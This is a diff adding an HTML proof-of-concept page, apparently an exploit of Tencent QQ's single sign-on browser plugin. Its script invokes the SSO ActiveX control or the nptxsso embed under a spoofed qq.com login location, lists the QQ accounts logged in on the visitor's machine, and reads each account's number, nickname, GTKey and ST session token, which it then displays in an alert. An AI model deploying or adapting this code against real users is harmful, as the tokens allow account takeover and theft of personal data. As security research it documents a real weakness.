@@ -1,0 +1,145 @@
+﻿<html>
+<body>
+<script>
+
+    var g_vOptData;
+    var mylocation="xui.ptlogin2.qq.com/cgi-bin1/qlogintest.html";
+    var pt = {
+        ishttps: false,
+        low_login: 0,
+        keyindex: 9,
+        init: function()
+        {
+            pt.ishttps = /^https/.test(mylocation);
+            //if (navigator.mimeTypes["application/nptxsso"]) {
+            var B = document.createElement("embed");
+            B.type ="application/nptxsso";
+            B.style.width ="0px";
+            B.style.height ="0px";
+            document.body.appendChild(B);
+            pt.sso = B
+        }
+    };
+    pt.init();
+
+    try {
+        if (window.ActiveXObject)
+        {
+            q_hummerQtrl = new ActiveXObject("SSOAxCtrlForPTLogin.SSOForPTLogin2");
+            var A = q_hummerQtrl.CreateTXSSOData();
+            q_hummerQtrl.InitSSOFPTCtrl(0, A);
+            g_vOptData = q_hummerQtrl.CreateTXSSOData()
+        }
+        hummer_loaduin();
+    } catch(B) {
+        alert("create ActiveXObject failed")
+    }
+
+ 
+
+    function hummer_loaduin()
+    {
+        if (window.ActiveXObject)
+        {
+            var Y = q_hummerQtrl.DoOperation(1, g_vOptData);
+            if (null == Y) {
+                return
+            }
+            try
+            {
+                var T = Y.GetArray("PTALIST");
+                var c = T.GetSize();
+                var X ="";
+                for (var d = 0; d < c; d++)
+                {
+                    var E = T.GetData(d);
+                    var a = E.GetDWord("dwSSO_Account_dwAccountUin");
+                    var J ="";
+                    var O = E.GetByte("cSSO_Account_cAccountType");
+                    var b = a;
+                    if (O == 1)
+                    {
+                        try
+                        {
+                            J = E.GetArray("SSO_Account_AccountValueList");
+                            b = J.GetStr(0)
+                        } catch(Z) {}
+                    }
+                    var Q = 0;
+                    try {
+                        Q = E.GetWord("wSSO_Account_wFaceIndex")
+                    } catch(Z) {
+                        Q = 0
+                    }
+                    var S ="";
+                    try {
+                        S = E.GetStr("strSSO_Account_strNickName")
+                    } catch(Z) {
+                        S =""
+                        }
+                    var F = E.GetBuf("bufGTKey_PTLOGIN");
+                    var G = E.GetBuf("bufST_PTLOGIN");
+                    var N ="";
+                    var A = G.GetSize();
+                    for (var W = 0; W < A; W++) {
+                        var B = G.GetAt(W).toString("16");
+                        if (B.length == 1) {
+                            B ="0" + B
+                        }
+                        N += B
+                    }
+                    var M = {
+                        uin: a,
+                        name: b,
+                        type: O,
+                        face: Q,
+                        nick: S,
+                        key: N
+                    };
+                    var str ="QQinfo\r\n"+
+                       "uin:" + M['uin']+"\r\n"+
+                       "name:"+M['name']+"\r\n"+
+                       "type:"+M['type']+"\r\n"+
+                       "face:"+M['face']+"\r\n"+
+                       "nick:"+M['nick']+"\r\n"+
+                       "key:"+M['key']+"\r\n";
+                    alert(str);
+                    q_aUinList[d] = M
+                }
+            } catch(Z) {}
+        } else
+        {
+            try {
+                var M = pt.sso;
+                var L = M.InitPVA();
+                if (L != false)
+                {
+                    var I = M.GetPVACount();
+                    for (var W = 0; W < I; W++)
+                    {
+                        var C = M.GetUin(W);
+                        var D = M.GetAccountName(W);
+                        var K = M.GetFaceIndex(W);
+                        var U = M.GetNickname(W);
+                        var P = M.GetGender(W);
+                        var V = M.GetUinFlag(W);
+                        var f = M.GetGTKey(W);
+                        var R = M.GetST(W);
+                    }
+                    var str ="QQinfo\r\n"+
+                       "uin:" + C +"\r\n"+
+                       "name:"+D+"\r\n"+
+                       "face:"+K +"\r\n"+
+                       "nick:"+U+"\r\n"+
+                       "key:"+f+"\r\n";
+                    alert(str);
+                }
+            } catch(Z) {}
+        }
+
+    }
+   // hummer_loaduin();
+</script>
+    aaaaaaaa
+</body>
+</html>
